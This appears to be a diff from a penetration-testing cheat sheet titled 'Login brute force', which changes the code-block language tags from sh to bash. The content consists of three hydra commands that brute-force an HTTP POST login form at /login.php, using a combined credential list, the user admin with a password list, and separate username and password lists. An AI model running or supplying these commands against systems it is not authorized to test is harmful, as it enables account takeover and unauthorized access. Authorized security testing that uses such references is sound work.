@@ -29,18 +29,18 @@ title: Login brute force
 
 ### Using a user and password list
 
-```sh
+```bash
 hydra -C <list> -s <port> -f <host> http-post-form "/login.php:username=^USER^&password=^PASS^:Login"
 ```
 
 ### Using user admin and password list
 
-```sh
+```bash
 hydra -l admin -P <passwords> -s <port> -f <host> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login"
 ```
 
 ### Using different lists for username and password
 
-```sh
+```bash
 hydra -L <usernames> -P <passwords> -s <port> -f <host> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login"
 ```
